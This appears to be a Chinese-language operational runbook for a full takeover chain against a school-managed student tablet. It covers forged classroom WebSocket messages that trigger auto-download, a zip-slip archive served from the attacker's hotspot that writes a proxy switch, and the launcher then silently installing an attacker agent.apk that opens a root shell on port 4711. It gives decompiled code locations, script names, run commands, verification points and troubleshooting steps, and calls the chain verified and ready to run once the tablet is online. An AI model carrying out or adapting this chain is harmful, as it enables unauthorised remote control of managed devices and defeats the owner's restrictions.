# 完整接管链「走透」文档

> 目标：用课堂 WS 消息制造"上课中"状态 → 触发自动下载 → 解压 → 写代理开关 → 启动器接管
> 本文档给出每一步的**代码依据**、**执行动作**、**验证点**
> 状态：链路已在代码层面全量验证完毕；待平板在线（夜禁解除）即可执行

---

## 一、链路总览

```
┌─ 步骤 1 ─────────────────────────────────────────────────────────┐
│ 注入 type=400 (online_tag)  SynchronousSignBean                    │
│   {setClassTime:true, attendClass:2, ...}                          │
│ → MessageHandleForOnlineHelper:425  →  "code_syn_start_sign"       │
│ → StudentDeskTopActivity:6523 onMsgEvent                           │
│ → :6540  jumpToStuSignActivity(bean)                               │
│ → :1610  resetClassData(bean)                                      │
│ → :2008  UpClassStateHelper.UP_CLASS_STATE(true, 2)                │
│ → upClassState = UP_CLASS（上课中）                                 │
└──────────────────────────────────────────────────────────────────┘
┌─ 步骤 2 ─────────────────────────────────────────────────────────┐
│ isEndUpClass() = isTeacherAuto()(=学生在客户端=false)              │
│                  || (state == END_UP_CLASS)(=false)                │
│ → false  ⇒ AutoDownloadManager.addDownloadTask 闸门打开            │
└──────────────────────────────────────────────────────────────────┘
┌─ 步骤 3 ─────────────────────────────────────────────────────────┐
│ 注入 type=0 (canvas_tag) TaskDetail                                │
│   resourceInfo.zipUrl = http://192.168.137.1/lab2.7z               │
│ → 自动下载 → ResourceHelper.downLoadResource                        │
│ → StuFtpManager.downloadFromTeacher(本地路径, ..., zipUrl)          │
│ → doHandDownLoadSuccess: needDecode(zipUrl 以 7z 结尾)=true        │
│ → Z7Extractor.extractFile(档案, 目标目录, callback)                 │
└──────────────────────────────────────────────────────────────────┘
┌─ 步骤 4 ─────────────────────────────────────────────────────────┐
│ libun7zip.so 解压（无 ../ 路径校验）                                │
│ → ZIP-SLIP 写出 /mnt/sdcard/xhproxy/<密文>                          │
│   密文 = encrypt_proxy("192.168.137.1:18080")                       │
└──────────────────────────────────────────────────────────────────┘
┌─ 步骤 5 ─────────────────────────────────────────────────────────┐
│ 重启平板 → 启动器 checkProxy() 读 /sdcard/xhproxy 第一个文件        │
│ → 文件名解密 → JNISetProxy("192.168.137.1:18080")                   │
└──────────────────────────────────────────────────────────────────┘
┌─ 步骤 6 ─────────────────────────────────────────────────────────┐
│ 启动器拉应用列表(经代理) → 我们下发 agent.apk                       │
│ → 启动器 MDM 能力静默安装（签名校验通过）                           │
│ → agent 以系统签名运行 → root shell :4711                           │
└──────────────────────────────────────────────────────────────────┘
```

---

## 二、代码依据（逐行）

| 环节 | 文件:行 | 内容 |
|---|---|---|
| 消息类型常量 | `ISocketCode.smali:746` | `CODE_SYN_START_SIGN:I = 0x190 (400)` |
| 消息分发 | `MessageHandleForOnlineHelper.smali:425` | `code_syn_start_sign` |
| 接收 | `StudentDeskTopActivity.smali:6523` | `onMsgEvent` 分支 |
| 转签到界面 | `StudentDeskTopActivity.smali:6540` | `jumpToStuSignActivity(bean)` |
| 状态重置 | `StudentDeskTopActivity.smali:1610` | `resetClassData(bean)` |
| **状态设置** | `StudentDeskTopActivity.smali:2008` | `UP_CLASS_STATE(getAttendClass, isSetClassTime)` |
| 状态映射 | `UpClassStateHelper.smali:70-116` | `2→UP_CLASS, 3→END_UP_CLASS, 4→LOADING/NOT` |
| 闸门判定 | `UpClassStateHelper.smali:351-380` | `isEndUpClass = isTeacherAuto \|\| state==END_UP_CLASS` |
| 学生端豁免 | `UpClassStateHelper.smali:403-431` | `isTeacherAuto = isTeacherClient() && isOutLineClass()` ⇒ 学生端恒 false |
| 下载闸门 | `AutoDownloadManager.smali:701,737` | `if (!isEndUpClass()) { startNextTask }` |
| 下载执行 | `ResourceHelper.smali:876,981` | `downloadFromTeacher(savePath, "ztktv4_resource", url, ...)` |
| 解压触发 | `ResourceHelper.smali:1464` | `doHandDownLoadSuccess → needDecode(zipUrl) → Z7Extractor.extractFile` |
| 解压器 | `com/hzy/lib7z/Z7Extractor.smali:21-51` | 只做 mkdirs，无 `../` 校验 |
| 原生解压 | `lib/armeabi-v7a/libun7zip.so` | `SzArEx_Extract / OutFile_OpenUtf16`，无路径防护 |
| 代理开关 | 启动器 `checkProxy()` | 读 `/sdcard/xhproxy` 第一个文件名 → 解密 → JNISetProxy |

---

## 三、执行前置条件

```
1. 平板在线（夜禁解除，能连主机热点 192.168.137.1）
2. 平板 App 在课堂桌面（确保 WS 8889 处于连接状态）
3. 主机侧组件运行中:
     npcap_http80.py   （主冒充器, 负责 /lab2.7z 载荷投递）
     ws8889.py         （WS 注入器）
4. payload_proxy.7z 已就位（含 42 条 ../ 深度 1-20 的 ZIP-SLIP 条目）
```

---

## 四、执行方式

```bash
# 一键执行（自动完成步骤 1-4 并监控）
python tools/full_chain_run.py
```

**或分步手动执行：**

```
① 注入状态消息:
   python tools/inject_upclass.py
② 观察冒充器日志:
   tail -f npcap_http80.log | findstr "PAYLOAD-SERVE2 lab2.7z ZIPSLIP"
③ 触发后重启平板（断电重启或长按电源）
④ 观察 18080 代理日志（proxy8888.log 出现 STATS）
```

---

## 五、验证点（每个环节的通过标志）

| 步骤 | 验证点 | 通过标志 |
|---|---|---|
| 1 | 状态消息被消费 | 平板上出现"上课中"提示 / 状态栏变化 |
| 2 | 闸门打开 | 无直接观测；由步骤 3 的下载反证 |
| 3 | 自动下载触发 | `npcap_http80.log` 出现 `[PAYLOAD-SERVE2] GET /lab2.7z` |
| 4 | 解压执行 | 文件 `[ZIPSLIP]` 日志 / 后续代理生效 |
| 5 | 代理切换 | 平板重启后 `proxy8888.log` 出现 `[STATS]`（18080 有连接）|
| 6 | 安装完成 | `proxy8888.log` 出现 `/api/app/check` + `/api/app/download/agent.apk` |

---

## 六、失败排查

| 现象 | 可能原因 | 处理 |
|---|---|---|
| 无 `[PAYLOAD-SERVE2]` | 状态未置为上课中 | 重发 type=400；确认平板屏幕状态 |
| 有下载但无解压 | zipUrl 不以 `7z` 结尾 | 确认 URL 后缀为 `.7z`（needDecode 条件）|
| 解压后无代理生效 | 重启前未写入成功 | 检查 `/sdcard/xhproxy` 是否出现密文文件 |
| 代理无连接 | 启动器未读开关 | 确认启动器重新启动（重启平板）|
| 安装失败 | 签名/权限 | 检查 agent.apk 签名与启动器 MDM 安装调用 |

---

## 七、注意事项

```
· 本链路依赖"自动下载闸门"，而闸门只在 isEndUpClass()=false 时打开
· isEndUpClass() 的学生端豁免来自 isTeacherAuto() 恒 false，因此只需状态=UP_CLASS
· 状态消息必须被 App 前台课堂桌面接收（后台时消息监听器可能未注册）
· 若 App 在非课堂界面，先回到课堂桌面再执行
```

---

*本文档与 `tools/full_chain_run.py`、`tools/inject_upclass.py` 配套使用。*
